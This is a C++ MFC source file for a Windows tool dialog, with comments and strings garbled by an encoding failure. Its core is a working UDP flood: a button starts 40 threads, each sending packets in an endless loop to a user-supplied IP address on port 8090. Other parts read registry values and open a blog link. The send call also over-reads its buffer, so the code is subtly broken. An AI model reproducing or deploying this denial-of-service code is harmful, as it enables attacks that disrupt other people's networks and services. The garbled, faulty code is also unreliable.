// tools.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "ȥ������.h"
#include "tools.h"
#include "afxdialogex.h"
#pragma comment(lib, "WS2_32.lib")
#include <WinSock.h>
#include <windows.h>
#include <windowsx.h>
#include <iostream> 
#include <tlhelp32.h>  
#include <cstring> 

#include <locale.h>
#include <cstdio>
#include <atlbase.h>
#include <stdio.h>
#include <io.h>
#include<fstream>
#include<vector>
#include <ctime>
#include <cstdlib>

// tools �Ի���
int threadnum=0;
char ipd[20];
int port,maxt;
IMPLEMENT_DYNAMIC(tools, CDialogEx)

	// CDDOSGUIDlg �Ի���

	WORD wVersionRequested;  
WSADATA wsaData;  
int err;  
DWORD WINAPI ddosin(LPVOID lp)
{
	while(1)
	{
		err = WSAStartup( wVersionRequested, &wsaData );  
		wVersionRequested = MAKEWORD( 2, 2 );
		if ( LOBYTE( wsaData.wVersion ) != 2 ||  HIBYTE( wsaData.wVersion ) != 2 )
		{                                 
			WSACleanup( );  
			return 0;   
		}  

		SOCKADDR_IN addrServer;  
		addrServer.sin_addr.S_un.S_addr = inet_addr(ipd);  
		addrServer.sin_family = AF_INET;  
		addrServer.sin_port = htons(port);  
		SOCKET sockClient = socket(AF_INET, SOCK_DGRAM, 0);  
		err = sendto(sockClient,"fuck you every day", 9000, 0, (SOCKADDR*)&addrServer, sizeof(SOCKADDR));  
		Sleep(10);
		closesocket(sockClient);  
		WSACleanup();
	}
}
tools::tools(CWnd* pParent /*=NULL*/)
	: CDialogEx(tools::IDD, pParent)
{

}

tools::~tools()
{
}

void tools::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(tools, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON1, &tools::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &tools::OnBnClickedButton2)
	ON_NOTIFY(IPN_FIELDCHANGED, IDC_IPADDRESS1, &tools::OnIpnFieldchangedIpaddress1)
END_MESSAGE_MAP()


// tools ��Ϣ�������


void tools::OnBnClickedButton1()
{
	ShellExecute(NULL, L"open",L"explorer.exe",L"https://blog.csdn.net/qq_37485351/article/details/99538316", NULL, SW_SHOW);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
}


BOOL tools::OnInitDialog()
{
	USES_CONVERSION;
	CDialogEx::OnInitDialog();

	HKEY hKEY;
	LPCTSTR data_Set=_T("SOFTWARE\\");
	long ret0, ret1;
	DWORD dataType;
	DWORD dataSize;
	TCHAR data[100] = {0};
	ret0 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, data_Set, NULL, KEY_READ|KEY_WOW64_64KEY, &hKEY);
	if(ret0 != ERROR_SUCCESS)        //����޷���hKEY,����ֹ�����ִ��
	{
		ret0 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, data_Set, NULL, KEY_READ, &hKEY);
		if(ret0 !=ERROR_SUCCESS )
			return 1;
	}
	ret1 = RegQueryValueEx(hKEY, L"pd", NULL, &dataType, (LPBYTE)data, &dataSize );
	if(ret1 != ERROR_SUCCESS)       //����޷���hKEY,����ֹ�����ִ��
	{
		SetDlgItemText(IDC_EDIT1,L"�����ڸ���");
		return 1;
	}
	else SetDlgItemText(IDC_EDIT1,data);

	ret1 = RegQueryValueEx(hKEY,L"360m", NULL, &dataType, (LPBYTE)data, &dataSize );
	if(ret1 != ERROR_SUCCESS)       //����޷���hKEY,����ֹ�����ִ��
	{
		SetDlgItemText(IDC_EDIT2,L"�����ڸ���");
		return 1;
	}
	else SetDlgItemText(IDC_EDIT2,data);
	
	RegCloseKey(hKEY);
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}


void tools::OnBnClickedButton2()
{
	port=8090;
	MessageBoxA(this->m_hWnd,"�˲�����ΪΣ�գ���������!","DANGER������",MB_OK);
	maxt=40;
	GetDlgItemTextA(this->m_hWnd,IDC_IPADDRESS1,ipd,20);

	if(strlen(ipd)==0)
	{
		MessageBoxA(this->m_hWnd,"�㻹û��������","����",MB_OK);
		return;
	}
	for(int i=1;i<=maxt;i++)
	{
		CreateThread(NULL,0,ddosin,0,0,0);
		Sleep(20);
		threadnum++;
	}
	MessageBoxA(this->m_hWnd,"���ڹ����������˳�����","ȥ������",MB_OK);

	// TODO: �ڴ���ӿؼ�֪ͨ����������
}


void tools::OnIpnFieldchangedIpaddress1(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMIPADDRESS pIPAddr = reinterpret_cast<LPNMIPADDRESS>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	*pResult = 0;
}
